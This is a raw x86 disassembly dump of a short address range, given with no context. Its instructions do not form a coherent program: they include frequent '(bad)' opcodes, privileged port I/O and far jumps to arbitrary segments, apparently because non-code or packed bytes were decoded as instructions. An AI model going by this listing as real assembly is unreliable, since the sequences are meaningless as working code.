  41d16e:	enter  0xb781,0xc5
  41d172:	out    dx,al
  41d173:	xchg   edx,eax
  41d174:	jg     0x41d1b7
  41d176:	add    cl,BYTE PTR [edx-0x21]
  41d179:	mov    al,ds:0xa132ef00
  41d17e:	and    edx,DWORD PTR [edx-0x57]
  41d181:	ja     0x41d106
  41d183:	aam    0xf
  41d185:	and    ebp,edx
  41d187:	sub    al,0x1b
  41d189:	adc    BYTE PTR [eax-0x44],0x70
  41d18d:	(bad)  
  41d18e:	sti    
  41d18f:	test   cl,ah
  41d191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d192:	pop    esp
  41d193:	push   cs
  41d194:	rcr    BYTE PTR [ebx],0x2d
  41d197:	xor    esi,DWORD PTR [ecx]
  41d199:	xchg   esp,eax
  41d19a:	pop    es
  41d19b:	pop    ebx
  41d19c:	pop    ebx
  41d19d:	or     al,0x0
  41d19f:	mov    DWORD PTR [esi-0x59],0x259736bf
  41d1a6:	cmc    
  41d1a7:	mov    ds:0x62b9b4c,al
  41d1ac:	push   eax
  41d1ad:	pop    edx
  41d1ae:	sbb    BYTE PTR [edx],ch
  41d1b0:	mov    DWORD PTR [edx+0x69],edi
  41d1b3:	push   esi
  41d1b4:	pop    ecx
  41d1b5:	ficomp WORD PTR [edi]
  41d1b7:	lods   al,BYTE PTR ds:[esi]
  41d1b8:	add    DWORD PTR [edx-0x1b],eax
  41d1bb:	ficomp DWORD PTR [ecx-0x7a540b33]
  41d1c1:	(bad)  
  41d1c2:	jo     0x41d216
  41d1c4:	xchg   ecx,eax
  41d1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1c6:	out    dx,eax
  41d1c7:	imul   esp,DWORD PTR [edx-0x38323a32],0xfffffffb
  41d1ce:	icebp  
  41d1cf:	repz (bad) 
  41d1d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1d2:	cmp    eax,0x5eb70513
  41d1d7:	inc    edx
  41d1d8:	mov    ah,0xc1
  41d1da:	out    0xa4,eax
  41d1dc:	mov    edi,gs
  41d1de:	out    0xe2,al
  41d1e0:	test   ebp,ecx
  41d1e2:	int    0x9a
  41d1e4:	pop    ecx
  41d1e5:	repnz fisttp DWORD PTR [edx-0x40]
  41d1e9:	mov    ebx,0xc6d166b6
  41d1ee:	adc    BYTE PTR [edi-0x47],ah
  41d1f1:	sub    edx,DWORD PTR [edx]
  41d1f3:	stos   DWORD PTR es:[edi],eax
  41d1f4:	ja     0x41d1f1
  41d1f6:	mov    dh,0xf7
  41d1f8:	add    al,0x13
  41d1fa:	xor    edi,eax
  41d1fc:	in     eax,dx
  41d1fd:	mov    ah,0x81
  41d1ff:	push   ebx
  41d200:	retf   0x7b59
  41d203:	loop   0x41d20c
  41d205:	push   0x44
  41d207:	dec    eax
  41d208:	das    
  41d209:	ins    DWORD PTR es:[edi],dx
  41d20a:	push   ds
  41d20b:	je     0x41d234
  41d20d:	mov    al,0xb4
  41d20f:	or     eax,0x1142b60a
  41d214:	lds    edx,FWORD PTR [ecx]
  41d216:	push   ss
  41d217:	lods   al,BYTE PTR ds:[esi]
  41d218:	dec    esp
  41d219:	lods   eax,DWORD PTR ds:[esi]
  41d21b:	stos   DWORD PTR es:[edi],eax
  41d21c:	dec    ecx
  41d21d:	mov    ds:0x1862c1f2,al
  41d222:	mov    ds:0x54d9a79a,eax
  41d227:	pop    ds
  41d228:	lods   eax,DWORD PTR ds:[esi]
  41d229:	push   0x40679398
  41d22e:	jmp    0x910625
  41d233:	and    esi,DWORD PTR [edx+eax*2-0x1e]
  41d237:	mov    BYTE PTR [esi-0x76],bl
  41d23a:	ins    BYTE PTR es:[edi],dx
  41d23b:	test   al,0xf3
  41d23d:	mov    DWORD PTR [edi-0x6474b9a6],edx
  41d243:	loopne 0x41d245
  41d245:	jmp    0xb368:0xaaa2617e
  41d24c:	es push es
  41d24e:	jp     0x41d21d
  41d250:	mov    ebp,0x4439b5a5
  41d255:	test   DWORD PTR [edx+ebp*8-0x1e],ebx
  41d259:	jecxz  0x41d268
  41d25b:	test   ch,bl
  41d25d:	loop   0x41d2d6
  41d25f:	push   0x66
  41d261:	retf   0xa74a
  41d264:	icebp  
  41d265:	xor    BYTE PTR [ebx-0x80],dl
  41d268:	pop    esp
  41d269:	pop    edx
  41d26a:	mov    bh,0xb7
  41d26c:	add    DWORD PTR [ebx+0x4eb169f7],edx
  41d272:	in     eax,dx
  41d273:	mov    ds:0x6229fe65,al
  41d278:	adc    eax,0x61556fb2
  41d27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d27e:	iret   
  41d27f:	jns    0x41d22c
  41d281:	int    0xa0
  41d283:	mov    edx,0xbf5d3fb8
  41d288:	jmp    0x27fa6126
  41d28d:	icebp  
  41d28e:	jge    0x41d291
  41d290:	jg     0x41d253
  41d292:	jmp    0xbd8d:0xa37e2e64
  41d299:	outs   dx,BYTE PTR ds:[esi]
  41d29a:	sub    al,0x3e
  41d29c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d29d:	in     eax,0x43
  41d29f:	lods   al,BYTE PTR ds:[esi]
  41d2a0:	ret    
  41d2a1:	int    0xab
  41d2a3:	sbb    BYTE PTR [ebx-0x1e2c3e8d],cl
  41d2a9:	or     ebp,DWORD PTR [edx+0x24f0fc28]
  41d2af:	repz (bad) [ecx+edx*8+0x7c]
  41d2b4:	adc    eax,0x65cd32d4
  41d2b9:	mov    edi,esi
  41d2bb:	ins    DWORD PTR es:[edi],dx
  41d2bc:	(bad)  
  41d2bd:	cld    
  41d2be:	adc    al,0x57
  41d2c0:	je     0x41d283
  41d2c2:	sbb    al,0x11
  41d2c4:	test   BYTE PTR [edi],ah
  41d2c6:	push   ebp
  41d2c7:	cs mov ah,0xa8
  41d2ca:	mov    DWORD PTR [esi-0x23d8bab2],esi
  41d2d0:	push   es
  41d2d1:	(bad)  
  41d2d2:	adc    esp,DWORD PTR [eax-0x41]
  41d2d5:	and    DWORD PTR [ecx+edx*4-0x3a],0xd9235b78
  41d2dd:	dec    esi
  41d2de:	adc    ebx,DWORD PTR [esi+0x5f]
  41d2e1:	cmp    eax,0x9c6d4bba
  41d2e6:	mov    dl,0xd5
  41d2e8:	imul   edi,DWORD PTR [ebx],0x5a9fde4c
  41d2ee:	mov    bh,0x7e
  41d2f0:	mov    ch,0x5a
  41d2f2:	outs   dx,DWORD PTR ds:[esi]
  41d2f3:	and    BYTE PTR [edx],bh
  41d2f5:	fwait
  41d2f6:	mov    ebp,0x6a230f04
  41d2fb:	imul   ebp,esp,0xffffffd8
  41d2fe:	out    dx,al
  41d2ff:	ror    BYTE PTR [ebp+0x7bfca916],1
  41d305:	repz jae 0x41d364
  41d308:	xchg   ebx,eax
  41d309:	imul   esp,DWORD PTR [ecx],0x47e0b614
  41d30f:	adc    esp,edx
  41d311:	imul   ebp,DWORD PTR [eax-0x71f5f23f],0x2
  41d318:	jp     0x41d2d9
  41d31a:	dec    ecx
  41d31b:	imul   BYTE PTR [ebp-0x3868c305]
  41d321:	xchg   ebp,eax
  41d322:	xchg   BYTE PTR [eax+0x53],ah
  41d325:	inc    edx
  41d326:	and    eax,DWORD PTR [eax-0x31]
  41d329:	push   ecx
  41d32a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d32b:	js     0x41d2b3
  41d32d:	test   DWORD PTR [ecx],0xb221a208
  41d333:	cdq    
  41d334:	cld    
  41d335:	mov    dh,0x87
  41d337:	cld    
  41d338:	int    0xb9
  41d33a:	jl     0x41d391
  41d33c:	(bad)  
  41d33d:	(bad)  
  41d33e:	test   eax,0x76a86d2e
  41d343:	xchg   ebx,eax
  41d344:	pop    es
  41d345:	inc    eax
  41d346:	ds sub eax,0xee550b2e
  41d34c:	neg    DWORD PTR [ecx-0x5f]
  41d34f:	xchg   edx,eax
  41d350:	xlat   BYTE PTR ds:[ebx]
  41d351:	ins    DWORD PTR es:[edi],dx
  41d352:	or     cl,BYTE PTR [edi+edi*2]
  41d355:	jecxz  0x41d3b0
  41d357:	ds dec edi
  41d359:	mov    esi,0xde9d2cf0
  41d35e:	xchg   ebp,eax
  41d35f:	mov    DWORD PTR [edi-0x35],ebp
  41d362:	inc    ebp
  41d363:	inc    esp
  41d364:	xor    cl,dl
  41d366:	add    DWORD PTR [ebp-0x2dbff847],ecx
  41d36c:	sbb    edx,DWORD PTR [esi]
  41d36e:	or     esp,DWORD PTR [edi+eax*2]
  41d371:	mov    al,ds:0xbb2aa168
  41d376:	jne    0x41d34c
  41d378:	cmp    DWORD PTR es:[ebp+0x7],edi
  41d37c:	adc    BYTE PTR [eax-0x43639d00],0x9f
  41d383:	call   0x18f7:0x39706409
  41d38a:	inc    ebp
  41d38b:	xchg   DWORD PTR [ebx],edx
  41d38d:	iret   
  41d38e:	sub    cl,BYTE PTR [edx+ecx*1+0x35]
  41d392:	adc    ebx,DWORD PTR [ebx]
  41d394:	fidiv  WORD PTR [eiz*2-0x7eaa971]
  41d39b:	push   0x3
  41d39d:	fucomip st,st(6)
  41d39f:	cmp    bl,bh
  41d3a1:	out    dx,al
  41d3a2:	mov    cl,0x5b
  41d3a4:	add    dl,bl
  41d3a6:	lods   al,BYTE PTR ds:[esi]
  41d3a7:	jno    0x41d3cb
  41d3a9:	arpl   WORD PTR [esi+0x4c],si
  41d3ac:	add    DWORD PTR [ebp-0xb],0x929d4e9a
  41d3b3:	ds jg  0x41d371
  41d3b6:	mov    cl,0xf4
  41d3b8:	test   cl,0xa2
  41d3bb:	inc    ecx
  41d3bc:	push   esp
  41d3bd:	adc    ebx,eax
  41d3bf:	inc    edi
  41d3c0:	ins    BYTE PTR es:[edi],dx
  41d3c1:	mov    al,ds:0x8337a8f6
  41d3c6:	into   
  41d3c7:	stos   DWORD PTR es:[edi],eax
  41d3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3c9:	jnp    0x41d411
  41d3cb:	push   esi
  41d3cc:	fdivr  QWORD PTR [ecx+0x56]
  41d3cf:	int    0xb8
  41d3d1:	(bad)  
  41d3d3:	xor    cl,BYTE PTR [edi]
  41d3d5:	mov    ds:0x1e78c265,al
  41d3da:	fistp  WORD PTR [edx+ecx*4]
  41d3dd:	pusha  
  41d3de:	mov    esp,0xca08553
  41d3e3:	stos   DWORD PTR es:[edi],eax
  41d3e4:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41d3e6:	pop    ebp
  41d3e7:	mov    ebx,0xf92755a0
  41d3ec:	test   ebx,ebx
  41d3ee:	lea    eax,[edx]
  41d3f0:	stos   BYTE PTR es:[edi],al
  41d3f1:	pop    esi
  41d3f2:	ins    DWORD PTR es:[edi],dx
  41d3f3:	stc    
  41d3f4:	inc    ebx
  41d3f5:	dec    edi
  41d3f6:	ins    DWORD PTR es:[edi],dx
  41d3f7:	push   ebp
  41d3f8:	lds    edi,FWORD PTR [ebp-0x54]
  41d3fb:	pop    ebp
  41d3fc:	inc    ebx
  41d3fd:	pop    ss
  41d3fe:	cmp    bl,BYTE PTR [ecx+0x3b]
  41d401:	nop
  41d402:	pop    es
  41d403:	call   0x75c5:0x11c62fdc
  41d40a:	cmc    
  41d40b:	shl    BYTE PTR [edi-0x61],cl
  41d40e:	fmul   QWORD PTR [ecx+0x49d55b55]
  41d414:	push   0x45
  41d416:	cwde   
  41d417:	and    BYTE PTR [ecx+0x6b],al
  41d41a:	pop    edi
  41d41b:	mov    edx,0x70a41934
  41d420:	(bad)  
  41d421:	jg     0x41d3b0
  41d423:	(bad)  
  41d424:	jno    0x41d3de
  41d426:	div    DWORD PTR [ebx+eiz*8]
  41d429:	dec    ebp
  41d42a:	jo     0x41d402
  41d42c:	add    eax,0x5701976b
  41d431:	cmp    eax,0x28063a0c
  41d436:	sbb    edi,ecx
  41d438:	das    
  41d439:	lods   al,BYTE PTR ds:[esi]
  41d43a:	aam    0x5a
  41d43c:	daa    
  41d43d:	aaa    
  41d43e:	es mov dl,0x2a
  41d441:	not    DWORD PTR [edi-0x32bf7877]
  41d447:	mov    al,0x94
  41d449:	or     DWORD PTR [ebx],ecx
  41d44b:	sub    eax,0x729b481
  41d450:	push   edx
  41d451:	retf   
  41d452:	sbb    DWORD PTR [edi+ebx*1+0x20],0x58
  41d457:	cmp    eax,0x47ee8c2
  41d45c:	cmc    
  41d45d:	scas   al,BYTE PTR es:[edi]
  41d45e:	sub    edi,ecx
  41d460:	popa   
  41d461:	sbb    DWORD PTR [ebp+0x2d],edx
  41d464:	dec    edi
  41d465:	ss loop 0x41d41a
  41d468:	dec    ebx
  41d469:	cld    
  41d46a:	sub    bh,BYTE PTR [ebx]
  41d46c:	push   ecx
  41d46d:	xor    BYTE PTR [ebx+ecx*2-0x7e8a8900],bl
  41d474:	test   eax,0xcb83c8ea
  41d479:	mov    ds:0x2d55131a,eax
  41d47e:	xchg   ebx,eax
  41d47f:	mov    esp,gs
  41d481:	int    0x6c
  41d483:	or     ch,bl
  41d485:	retf   0x619a
  41d488:	imul   esp,DWORD PTR [ebp+0x36fb36c6],0x3b
  41d48f:	cld    
  41d490:	sub    DWORD PTR [ecx-0x51d81a89],esp
  41d496:	or     DWORD PTR [edi-0x5a8623c],edi
  41d49c:	in     al,0x5
  41d49e:	adc    DWORD PTR [ebp-0x4a],edx
  41d4a1:	mov    cs,WORD PTR [edx]
  41d4a3:	clc    
  41d4a4:	scas   al,BYTE PTR es:[edi]
  41d4a5:	fdivr  st,st(5)
  41d4a7:	add    ch,0xa0
  41d4aa:	into   
  41d4ab:	data16 sub dh,BYTE PTR [ecx]
  41d4ae:	sbb    BYTE PTR [ebx],dh
  41d4b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4b1:	sbb    cl,ah
  41d4b3:	jb     0x41d470
  41d4b5:	dec    esi
  41d4b6:	add    dh,BYTE PTR [ebx-0xb22d7af]
  41d4bc:	adc    bl,BYTE PTR [ebp+edx*8+0x7d]
  41d4c0:	jg     0x41d527
  41d4c2:	lds    ebp,FWORD PTR [eax-0x37cb4ca0]
  41d4c8:	xchg   edx,eax
  41d4c9:	dec    esi
  41d4ca:	dec    ebp
  41d4cb:	or     BYTE PTR [ebx-0x51],0xf2
  41d4cf:	fwait
  41d4d0:	or     esp,eax
  41d4d2:	ror    DWORD PTR [edi],0x79
  41d4d5:	jbe    0x41d4a4
  41d4d7:	add    eax,0xae7a17f5
  41d4dc:	xor    dh,dh
  41d4de:	xor    DWORD PTR [edx],esi
  41d4e0:	imul   ecx,DWORD PTR [ecx+0x6e],0x8faeef6d
  41d4e7:	add    esi,DWORD PTR [eax+0x6c]
  41d4ea:	aad    0x81
  41d4ec:	ret    
  41d4ed:	repnz popf 
  41d4ef:	pop    eax
  41d4f0:	out    0x79,eax
  41d4f2:	out    dx,al
  41d4f3:	arpl   WORD PTR [ebx+edi*2+0x5b57b3e1],bp
  41d4fa:	cs call 0x1436c33a
  41d500:	div    BYTE PTR [edi-0x67523611]
  41d506:	and    ecx,edi
  41d508:	and    DWORD PTR [eax],ecx
  41d50a:	pop    esi
  41d50b:	stos   BYTE PTR es:[edi],al
  41d50c:	dec    ebx
  41d50d:	mov    edx,0x26bdc1d6
  41d512:	cdq    
  41d513:	ds fcmovb st,st(4)
  41d516:	dec    edi
  41d517:	ins    DWORD PTR es:[edi],dx
  41d518:	cli    
  41d519:	jo     0x41d4db
  41d51b:	rcr    DWORD PTR [ecx],cl
  41d51d:	fwait
  41d51e:	lahf   
  41d51f:	lods   al,BYTE PTR ds:[esi]
  41d520:	inc    ecx
  41d521:	into   
  41d522:	loopne 0x41d59c
  41d524:	fnsave [edi-0x6f]
  41d527:	mov    DWORD PTR [edi+0x67],esp
  41d52a:	mov    ah,0xf3
  41d52c:	inc    ebx
  41d52d:	cmp    dl,BYTE PTR gs:[ecx-0x6ee13c3f]
  41d534:	xor    DWORD PTR [ebx-0x2f],esp
  41d537:	xchg   esp,eax
  41d538:	xlat   BYTE PTR ds:[ebx]
  41d539:	arpl   WORD PTR [esi+0x7ceae1b1],ax
  41d53f:	mov    edx,0x9b4d2cef
  41d544:	add    dh,dh
  41d546:	adc    eax,0xdb069ed0
  41d54b:	inc    ebp
  41d54c:	pushf  
  41d54d:	iret   
  41d54e:	cli    
  41d54f:	cs inc dx
  41d552:	mov    ch,0x36
  41d554:	in     eax,0x40
  41d556:	jge    0x41d563
  41d558:	in     eax,dx
  41d559:	dec    eax
  41d55a:	in     al,dx
  41d55b:	das    
  41d55c:	cld    
  41d55d:	mov    WORD PTR es:[edx+0x38245f85],?
  41d564:	sub    BYTE PTR [edx],cl
  41d566:	clc    
  41d567:	scas   al,BYTE PTR es:[edi]
  41d568:	clc    
  41d569:	cdq    
  41d56a:	jo     0x41d52d
  41d56c:	and    al,0xd3
  41d56e:	in     al,0x18
  41d570:	sti    
  41d571:	or     al,0x4
  41d573:	dec    ebx
  41d574:	inc    esi
  41d575:	xchg   edx,eax
  41d576:	fsubr  st,st(2)
  41d578:	out    0x6f,eax
  41d57a:	cmc    
  41d57b:	mov    eax,0x2c1b3d4d
  41d580:	cmp    eax,0x20c0ca49
  41d585:	imul   esp,DWORD PTR [ecx],0xffffffee
  41d588:	pop    esi
  41d589:	cmc    
  41d58a:	xchg   ebx,eax
  41d58b:	pop    eax
  41d58c:	cmc    
  41d58d:	jne    0x41d5da
  41d58f:	sar    BYTE PTR [edi],0x9d
  41d592:	mov    ds:0x5c2a3e0a,eax
  41d597:	std    
  41d598:	add    edx,DWORD PTR [ecx]
  41d59a:	cmp    eax,0xeff45d07
  41d59f:	shl    esp,0x8f
  41d5a2:	jb     0x41d59f
  41d5a4:	xchg   ebx,eax
  41d5a5:	inc    esi
  41d5a6:	mov    edx,0xa57703ae
  41d5ab:	jge    0x41d607
  41d5ad:	mov    ebx,0x35d5cb03
  41d5b2:	mov    edx,0x1c783933
  41d5b7:	fmul   QWORD PTR ds:0x8c68ba69
  41d5bd:	jmp    0x41d5e9
  41d5bf:	and    BYTE PTR [ecx+0x60],bh
  41d5c2:	(bad)  
  41d5c3:	not    al
  41d5c5:	in     eax,dx
  41d5c6:	xor    BYTE PTR [ecx],ch
  41d5c8:	mov    ebp,0x7e57a348
  41d5cd:	(bad)  
  41d5ce:	mov    dl,0xaa
  41d5d0:	push   ds
  41d5d1:	jb     0x41d580
  41d5d3:	xchg   esp,eax
  41d5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5d5:	lods   al,BYTE PTR ds:[esi]
  41d5d6:	icebp  
  41d5d7:	(bad)  
  41d5d8:	fwait
  41d5d9:	add    edi,esi
  41d5db:	adc    BYTE PTR [eax],cl
  41d5dd:	lods   al,BYTE PTR ds:[esi]
  41d5de:	iret   
  41d5df:	push   ds
  41d5e0:	ror    ebp,1
  41d5e2:	pop    edx
  41d5e3:	xor    dh,BYTE PTR [ecx-0x38]
  41d5e6:	jno    0x41d61a
  41d5e8:	push   ebx
  41d5e9:	xor    DWORD PTR [ebp-0x3c93393],esp
  41d5ef:	pushf  
  41d5f0:	sub    ebx,DWORD PTR [ebx]
  41d5f2:	adc    edi,0xd50eccd3
  41d5f8:	or     bl,bh
  41d5fa:	dec    ecx
  41d5fb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5fd:	push   0x1f
  41d5ff:	retf   
  41d600:	fidivr WORD PTR ds:[esp+eax*2]
  41d604:	inc    edi
  41d605:	(bad)  
  41d606:	rcr    BYTE PTR [ebx],cl
  41d608:	mov    ah,0xf2
  41d60a:	or     eax,0x98a4aeb7
  41d60f:	add    BYTE PTR [edx-0x3c],bl
  41d612:	inc    eax
  41d613:	call   0xbabc6089
  41d618:	pop    edx
  41d619:	dec    esp
  41d61a:	jp     0x41d5cc
  41d61c:	add    eax,0xe0781294
  41d621:	xchg   DWORD PTR [edx],esi
  41d623:	mov    ch,0x3a
  41d625:	sbb    bl,al
  41d627:	sub    DWORD PTR [eax+0x5c],edx
  41d62a:	jo     0x41d5d1
  41d62c:	xchg   ebp,eax
  41d62d:	or     al,0x3b
  41d62f:	mov    dl,0x9
  41d631:	mov    eax,0xe393df91
  41d636:	mov    al,ds:0x7d11041b
  41d63b:	(bad)  
  41d63c:	fwait
  41d63d:	inc    ebp
  41d63e:	test   BYTE PTR [ebx+0x3e],dl
  41d641:	and    ebp,DWORD PTR [esi-0x41ff4c06]
  41d647:	ins    BYTE PTR es:[edi],dx
  41d648:	mov    dh,0x96
  41d64a:	sub    esp,DWORD PTR [ecx+0x57]
  41d64d:	xor    al,0xf2
  41d64f:	dec    esi
  41d650:	test   DWORD PTR [eax-0x3a],ecx
  41d653:	mov    ds:0x8fbc6d2b,eax
  41d658:	mov    cs,WORD PTR [ebp-0x7af94d45]
  41d65e:	inc    ebp
  41d65f:	sbb    bh,al
  41d661:	mov    edi,0x1052ca74
  41d666:	xchg   esi,eax
  41d667:	xor    esi,DWORD PTR [edx-0x7b352714]
  41d66d:	outs   dx,DWORD PTR ds:[esi]
  41d66e:	sub    ah,bh
  41d670:	dec    edx
  41d671:	mov    ebp,0xdebdffe1
  41d676:	push   edi
  41d677:	mov    ebx,0xa0b4d99d
  41d67d:	stc    
  41d67e:	inc    ebx
  41d67f:	dec    ebp
  41d680:	loopne 0x41d644
  41d682:	mov    esi,0xe06509a8
  41d687:	xor    ebp,DWORD PTR cs:[eax]
  41d68a:	imul   ecx,DWORD PTR [eax+0x364722f3],0x15
  41d691:	jge    0x41d6be
  41d693:	jo     0x41d70c
  41d695:	push   esp
  41d696:	rcl    esp,0x9f
  41d699:	mov    edi,0x59aa7ac6
  41d69e:	push   edx
  41d69f:	inc    DWORD PTR [edi]
  41d6a1:	mov    ebp,0x5e151c89
  41d6a6:	scas   al,BYTE PTR es:[edi]
  41d6a7:	push   edi
  41d6a8:	dec    ecx
  41d6a9:	mov    WORD PTR [edi-0x2db4d1c3],gs
  41d6af:	or     eax,0xd36439b8
  41d6b4:	sub    esi,DWORD PTR [esi]
  41d6b6:	push   edx
  41d6b7:	repz idiv BYTE PTR [esi]
  41d6ba:	jp     0x41d69c
  41d6bc:	sub    dl,BYTE PTR [edi]
  41d6be:	aas    
  41d6bf:	push   esi
  41d6c0:	push   esi
  41d6c1:	cmp    eax,0x56736a5c
  41d6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6c7:	push   ebp
  41d6c8:	dec    esi
  41d6c9:	mov    al,0x66
  41d6cb:	jae    0x41d74a
  41d6cd:	nop
  41d6ce:	adc    al,0x4f
  41d6d0:	sbb    al,0x68
  41d6d2:	push   eax
  41d6d3:	aas    
  41d6d4:	add    al,0x3e
  41d6d6:	fmul   st,st(4)
  41d6d8:	jbe    0x41d675
  41d6da:	aaa    
  41d6db:	or     cl,bh
  41d6dd:	jl     0x41d70b
  41d6df:	scas   eax,DWORD PTR es:[edi]
  41d6e0:	add    al,BYTE PTR [ebp+0x35]
  41d6e3:	xchg   BYTE PTR [eax+0x3141f02b],bh
  41d6e9:	xchg   esi,eax
  41d6ea:	icebp  
  41d6eb:	pop    es
  41d6ec:	bound  edx,QWORD PTR [ebp+ebx*1+0x5a4b18c3]
  41d6f3:	out    dx,eax
  41d6f4:	xor    eax,0x3ae86c5e
  41d6f9:	leave  
  41d6fa:	fadd   st,st(5)
  41d6fc:	xor    eax,0xd146bc88
  41d701:	(bad)  
  41d702:	adc    ecx,esp
  41d704:	push   ebp
  41d705:	inc    edx
  41d706:	pop    esp
  41d707:	push   ds
  41d708:	cld    
  41d709:	outs   dx,BYTE PTR ds:[esi]
  41d70a:	dec    ebx
  41d70b:	ja     0x41d6b9
  41d70d:	jecxz  0x41d71e
  41d70f:	les    edi,FWORD PTR [ecx+edx*8+0x2a12d4e9]
  41d716:	std    
  41d717:	int3   
  41d718:	jmp    0x4b74:0x28fd1147
  41d71f:	aaa    
  41d720:	dec    ebp
  41d721:	outs   dx,BYTE PTR ds:[esi]
  41d722:	out    0xca,al
  41d724:	jle    0x41d77f
  41d726:	je     0x41d788
  41d728:	test   eax,0x8848b7e1
  41d72d:	add    bl,BYTE PTR [edi-0x66]
  41d730:	lahf   
  41d731:	jle    0x41d6dc
  41d733:	or     ecx,DWORD PTR [ebx+0x4f2d29c3]
  41d739:	xchg   DWORD PTR [edx],eax
  41d73b:	or     bl,BYTE PTR [edx]
  41d73d:	int    0xf1
  41d73f:	mov    DWORD PTR [edi],ecx
  41d741:	std    
  41d742:	xlat   BYTE PTR ds:[ebx]
  41d743:	enter  0x54c3,0x6a
  41d747:	inc    ebp
  41d748:	icebp  
  41d749:	or     BYTE PTR [ecx],bl
  41d74b:	cli    
  41d74c:	jne    0x41d77a
  41d74e:	mov    eax,ds:0x4558fced
  41d753:	add    BYTE PTR [edi+0x51],0xaa
  41d757:	jmp    0x41d760
  41d759:	cmp    bl,bh
  41d75b:	(bad)  [ebx+0x46]
  41d75e:	clc    
  41d75f:	(bad)  
  41d761:	sbb    al,BYTE PTR [eax+0x1a]
  41d764:	push   esi
  41d765:	xchg   edi,eax
  41d766:	mov    ebx,0x3e933d52
  41d76b:	jge    0x41d7a5
  41d76d:	inc    ebx
  41d76e:	jbe    0x41d736
  41d770:	dec    esi
  41d771:	jbe    0x41d7bb
  41d773:	and    ebx,DWORD PTR [eax]
  41d775:	sub    ah,bh
  41d777:	pop    eax
  41d778:	int3   
  41d779:	and    BYTE PTR [eax-0x63],0x65
  41d77d:	fcmovnu st,st(1)
  41d77f:	cli    
  41d780:	or     al,0xf
  41d782:	aad    0xaa
  41d784:	mov    dl,0x33
  41d786:	(bad)  
  41d787:	fmul   QWORD PTR [ecx]
  41d789:	test   BYTE PTR ds:0xc237b6ee,dl
  41d78f:	add    DWORD PTR [eax],esi
  41d791:	fs mov ebx,0x71cbf77f
  41d797:	push   eax
  41d798:	scas   al,BYTE PTR es:[edi]
  41d799:	jns    0x41d75d
  41d79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d79c:	in     eax,dx
  41d79d:	mov    esi,0x9deb1551
  41d7a2:	or     esi,0xfa44f4c4
  41d7a8:	mov    ecx,0x9ee2c510
  41d7ad:	stc    
  41d7ae:	es xor eax,0x22d50c20
  41d7b4:	das    
  41d7b5:	jecxz  0x41d825
  41d7b7:	push   ss
  41d7b8:	sbb    esi,DWORD PTR [eax]
  41d7ba:	std    
  41d7bb:	mov    ch,0x64
  41d7bd:	mov    dl,0x6a
  41d7bf:	xlat   BYTE PTR ds:[ebx]
  41d7c0:	mov    ah,0x89
  41d7c2:	push   edx
  41d7c3:	cmp    dl,BYTE PTR [edx+0x24b4d8fe]
  41d7c9:	ret    0x7f51
  41d7cc:	aas    
  41d7cd:	inc    eax
  41d7ce:	xor    BYTE PTR [ebp-0x10],bl
  41d7d1:	cmp    eax,0x247c5ea
  41d7d6:	mov    ch,0xec
  41d7d8:	xchg   esi,eax
  41d7d9:	int3   
  41d7da:	fstp   TBYTE PTR ds:0xf20ea711
  41d7e0:	jle    0x41d828
  41d7e2:	mov    cl,BYTE PTR [ebx-0x17ae8597]
  41d7e8:	add    dl,BYTE PTR [ebp+0xe]
  41d7eb:	in     eax,0x0
  41d7ed:	int3   
  41d7ee:	cld    
  41d7ef:	add    eax,DWORD PTR [edx]
  41d7f1:	adc    DWORD PTR [esi],eax
  41d7f3:	clc    
  41d7f4:	dec    eax
  41d7f5:	add    BYTE PTR [edi-0x797e2e84],dh
  41d7fb:	loopne 0x41d77e
  41d7fd:	arpl   bp,si
  41d7ff:	ins    DWORD PTR es:[edi],dx
  41d800:	add    eax,0x228b35a6
  41d805:	arpl   WORD PTR [ebp+0x3532c36e],bx
  41d80b:	(bad)  
  41d80c:	add    cl,BYTE PTR [ebp-0x58]
  41d80f:	clc    
  41d810:	adc    cl,BYTE PTR [ebx+0x43]
  41d813:	pop    esi
  41d814:	or     DWORD PTR [ebx-0x15],esi
  41d817:	sub    al,0x5a
  41d819:	(bad)  
  41d81a:	lods   al,BYTE PTR ds:[esi]
  41d81b:	cs mov ebx,0xb34bf735
  41d821:	das    
  41d822:	out    dx,eax
  41d823:	adc    ecx,DWORD PTR [esi+eax*2+0x5471b05c]
  41d82a:	jb     0x41d884
  41d82c:	jl     0x41d8a8
  41d82e:	xchg   DWORD PTR [ebx+0x34b77ca4],esi
  41d834:	xlat   BYTE PTR ds:[ebx]
  41d835:	(bad)  
  41d836:	cwde   
  41d837:	(bad)  
  41d838:	adc    eax,DWORD PTR [ecx+eiz*4-0x15]
  41d83c:	addr16 aad 0xb1
  41d83f:	out    0x13,al
  41d841:	repz out 0xa9,al
  41d844:	(bad)  
  41d845:	dec    ebx
  41d846:	pop    ebx
  41d847:	repnz mov ds:0x3daccf30,eax
  41d84d:	adc    BYTE PTR [eax],ch
  41d84f:	out    dx,eax
  41d850:	mov    ds:0x661d48cb,eax
  41d855:	scas   al,BYTE PTR es:[edi]
  41d856:	inc    esp
  41d857:	repnz and edx,edx
  41d85a:	pop    eax
  41d85b:	adc    ebx,DWORD PTR [ebp-0x7902e5db]
  41d861:	push   es
  41d862:	inc    esi
  41d863:	or     ch,BYTE PTR [ecx-0x4e393e9f]
  41d869:	out    0x3d,al
  41d86b:	dec    eax
  41d86c:	mov    ebx,DWORD PTR [eax+esi*2]
  41d86f:	loop   0x41d829
  41d871:	dec    ebp
  41d872:	inc    ebp
  41d873:	mov    dl,0x4f
  41d875:	mov    eax,eax
  41d877:	cmp    eax,0xab64d8a5
  41d87c:	int    0x3f
  41d87e:	sbb    eax,ecx
  41d880:	dec    eax
  41d881:	(bad)  
  41d882:	cmp    al,0xc4
  41d884:	sbb    eax,0x1d55778c
  41d889:	push   0x8
